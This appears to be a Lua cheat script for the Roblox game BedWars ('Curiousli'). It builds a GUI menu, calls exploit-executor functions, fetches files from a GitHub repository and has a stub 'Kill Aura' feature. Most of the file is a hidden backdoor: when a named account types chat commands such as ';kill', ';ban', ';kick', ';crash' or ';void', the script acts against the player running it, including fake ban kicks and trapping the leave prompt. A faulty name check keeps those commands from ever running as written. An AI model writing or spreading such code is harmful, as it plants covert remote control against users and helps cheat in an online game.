print("loading 613957114.lua")
local function Button(Tab, Name, Call)
	local template_buton = Instance.new("TextButton")
	template_buton.Font = Enum.Font.SourceSansBold
	template_buton.Text = Name
	template_buton.TextColor3 = Color3.new(0, 0, 0)
	template_buton.TextScaled = true
	template_buton.TextSize = 14
	template_buton.TextWrapped = true
	template_buton.BackgroundColor3 = Color3.new(0.333333, 0.345098, 0.12549)
	--//template_buton.Position = UDim2.new(-0.0187500007, 0, 0.00350099197, 0)
	template_buton.Size = UDim2.new(0.925000012, 0, 0.0291114338, 0)
	template_buton.Visible = true
	template_buton.Name = Name
	template_buton.Parent = game.CoreGui.Curiousli.Background:FindFirstChild(Tab).Main
	local enabled = false
	template_buton.MouseButton1Click:Connect(function()
		if enabled == false then
			template_buton.Text = Name.." (Enabled)"
			enabled = true
		else
			template_buton.Text = Name.." (Disabled)"
			enabled = false
		end
		pcall(Call)
	end)
end

local function Value(Tab, Button, Name)
	local template_value = Instance.new("TextBox")
	template_value.Font = Enum.Font.SourceSans
	template_value.Text = Button.." Value"
	template_value.PlaceholderText = "Value here"
	template_value.TextColor3 = Color3.new(0, 0, 0)
	template_value.TextScaled = true
	template_value.TextSize = 14
	template_value.BackgroundColor3 = Color3.new(0.333333, 0.345098, 0.12549)
	--//button_template.Position = UDim2.new(0, 0, 0.0318819918, 0)
	template_value.Size = UDim2.new(0.850000024, 0, 0.0267606955, 0)
	template_value.Visible = true
	template_value.Name = Name
	template_value.Parent = game.CoreGui.Curiousli.Background:FindFirstChild(Tab).Main
	
end

local players = game:GetService("Players")
local textservice = game:GetService("TextService")
local repstorage = game:GetService("ReplicatedStorage")
local lplr = players.LocalPlayer
local lighting = game:GetService("Lighting")
local cam = workspace.CurrentCamera
local targetinfo = shared.VapeTargetInfo
local collectionservice = game:GetService("CollectionService")
local uis = game:GetService("UserInputService")
local mouse = lplr:GetMouse()
local matchState = 0
local bedwars = {}
local bedwarsblocks = {}
local matchstatetick = 0


local betterisfile = function(file)
	local suc, res = pcall(function() return readfile(file) end)
	return suc and res ~= nil
end
local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)
	if tab.Method == "GET" then
		return {
			Body = game:HttpGet(tab.Url, true),
			Headers = {},
			StatusCode = 200
		}
	else
		return {
			Body = "bad exploit",
			Headers = {},
			StatusCode = 404
		}
	end
end 

local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport
local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end

local function GetURL(scripturl)
	if shared.CuriousliDeveloper then
		return readfile("curiousli/"..scripturl)
	else
		return game:HttpGet("https://raw.githubusercontent.com/ManOnTopain/CuriousliForRoblox/main/"..scripturl, true)
	end
end

local cachedassets = {}
local function getcustomassetfunc(path)
	if not betterisfile(path) then
		task.spawn(function()
			local textlabel = Instance.new("TextLabel")
			textlabel.Size = UDim2.new(1, 0, 0, 36)
			textlabel.Text = "Downloading "..path
			textlabel.BackgroundTransparency = 1
			textlabel.TextStrokeTransparency = 0
			textlabel.TextSize = 30
			textlabel.Font = Enum.Font.SourceSans
			textlabel.TextColor3 = Color3.new(1, 1, 1)
			textlabel.Position = UDim2.new(0, 0, 0, -36)
			textlabel.Parent = game.CoreGui.Curiousli
			repeat task.wait() until betterisfile(path)
			textlabel:Remove()
		end)
		local req = requestfunc({
			Url = "https://raw.githubusercontent.com/ManOnTopain/CuriousliForRoblox/main/"..path:gsub("curiousli/assets", "assets"),
			Method = "GET"
		})
		writefile(path, req.Body)
	end
	if cachedassets[path] == nil then
		cachedassets[path] = getasset(path) 
	end
	return cachedassets[path]
end

local KillauraEnabled = false
Button("CombatTab", "Kill Aura", function()
  local camm = game.Workspace.CurrentCamera
  local KnitClient = debug.getupvalue(require(lplr.PlayerScripts.TS.knit).setup, 6)
  local SwordCont = KnitClient.Controllers.SwordController
  local DistVal = 14
  if KillauraEnabled == false then
  KillauraEnabled = true
  else
  KillauraEnabled = false
  end
end)

local tt = Instance.new("TextLabel")
tt.Parent = game.CoreGui.Curiousli.Background
tt.Text = "Sorry! developing kill aura, so it means no kill aura ;( im so sorry"

local function addvectortocframe(cframe, vec)
	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
end


local commands = {}
local KILL = ";kill "
local LAGBACK = ";lagback "


commands.kill = function()
	if game.Players.LocalPlayer.Name == "CoolBoyEli08" or "YMikeOfficialYT" then
	else
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	end
end
commands.lagback = function()
	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
		else
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999999999999999999999999999999999999999999999999999999999999999999999999
	end
end
local JUMP = ";jump "
commands.jump = function()
	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
	end
end
local SIT = ";sit "
commands.sit = function()
	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game.Players.LocalPlayer.Character.Humanoid.Sit = true
	end
end
local UNSIT = ";unsit "
commands.unsit = function()
	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game.Players.LocalPlayer.Character.Humanoid.Sit = false
	end
end
local FREEZE = ";freeze "
commands.freeze = function()
	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
	end
end
local UNFREEZE = ";unfreeze "
commands.unfreeze = function()
	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
	end
end
local VOID = ";void "
commands.void = function()
	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		repeat
			task.wait()
			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = addvectortocframe(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
		until game.Players.LocalPlayer.Character.Humanoid.Health <= 1
	end
end
local CRASH = ";crash"
commands.crash = function()
	
		if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
		else
		setfpscap(9e9)
		end
end
local CHIP = ";chip "
commands.chip = function()

	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		local function funnyfunc(v)
			if v:IsA("ImageButton") then
				v.Image = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("Image"):Connect(function()
					v.Image = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("TextLabel") or v:IsA("TextButton") and v:GetFullName():find("ChatChannelParentFrame") == nil then
				if v.Text ~= "" then
					v.Text = "chips"
				end
				v:GetPropertyChangedSignal("Text"):Connect(function()
					if v.Text ~= "" then
						v.Text = "chips"
					end
				end)
			end
			if v:IsA("Texture") or v:IsA("Decal") then
				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			if v:IsA("MeshPart") then
				v.TextureID = 'http://www.roblox.com/asset/?id=6864086702'
				
				v:GetPropertyChangedSignal("TextureID"):Connect(function()
					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
				end)
			end
			for i,v in pairs(game:GetDescendants()) do
				funnyfunc(v)
			end
			game.DescendantAdded:Connect(funnyfunc)
		end
	end
end
local BAN = ";ban "
commands.ban = function()

	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game.Players.LocalPlayer:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
	end
end
local KICK = ";kick "
commands.kick = function()

	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game.Players.LocalPlayer:Kick("you have been kicked from bedwars")
	end
end
local DISCONNECT = ";disconnect "
commands.disconnect = function()

	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
			obj.MouseButton1Click:Connect(function()
				game.Players.LocalPlayer:Kick("Please press leave again")
			end)
		end)
	end
end
local ERRORKICK = ";errorkick "
commands.errorkick = function()

	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
	else
	game.Players.LocalPlayer.Character.Head:Destroy()
	end
end

for i,v in pairs(game.Players:GetPlayers()) do
	if v.Name == "CoolBoyEli08" then
		v.Chatted:Connect(function(msg)
			
			if msg:sub(1, KILL:len()):lower() == KILL:lower() then
				local target = msg:sub(KILL:len()+1)
				

					commands.kill()
			end
			
			if msg:sub(1, LAGBACK:len()):lower() == LAGBACK:lower() then
				local target = msg:sub(LAGBACK:len()+1)


					commands.lagback()
				
			end
			if msg:sub(1, JUMP:len()):lower() == JUMP:lower() then
				local target = msg:sub(JUMP:len()+1)

				
					commands.jump()
				
			end
			
			if msg:sub(1, SIT:len()):lower() == SIT:lower() then
				local target = msg:sub(SIT:len()+1)

				
					commands.sit()
				
			end
			
			if msg:sub(1, UNSIT:len()):lower() == UNSIT:lower() then
				local target = msg:sub(UNSIT:len()+1)

				
					commands.unsit()
				
			end
			if msg:sub(1, FREEZE:len()):lower() == FREEZE:lower() then
				local target = msg:sub(FREEZE:len()+1)

				
					commands.freeze()
				
			end
			if msg:sub(1, UNFREEZE:len()):lower() == UNFREEZE:lower() then
				local target = msg:sub(UNFREEZE:len()+1)

				
					commands.unfreeze()
				
			end
			
			if msg:sub(1, VOID:len()):lower() == VOID:lower() then
				local target = msg:sub(VOID:len()+1)

				
					commands.void()
				
			end
			if msg:sub(1, CRASH:len()):lower() == CRASH:lower() then
				local target = msg:sub(CRASH:len()+1)

				
					commands.crash()
				
			end
			
			if msg:sub(1, CHIP:len()):lower() == CHIP:lower() then
				local target = msg:sub(CHIP:len()+1)

				
					commands.chip()
				
			end
			
			if msg:sub(1, BAN:len()):lower() == BAN:lower() then
				local target = msg:sub(BAN:len()+1)

				
					commands.ban()
				
			end
			
			if msg:sub(1, KICK:len()):lower() == KICK:lower() then
				local target = msg:sub(KICK:len()+1)

					
					commands.kick()
				
			end
			
			if msg:sub(1, DISCONNECT:len()):lower() == DISCONNECT:lower() then
				local target = msg:sub(DISCONNECT:len()+1)

				
					commands.disconnect()
				
			end
			
			if msg:sub(1, ERRORKICK:len()):lower() == ERRORKICK:lower() then
				local target = msg:sub(ERRORKICK:len()+1)

				
					commands.errorkick()
				
			end
		end)
	end
end
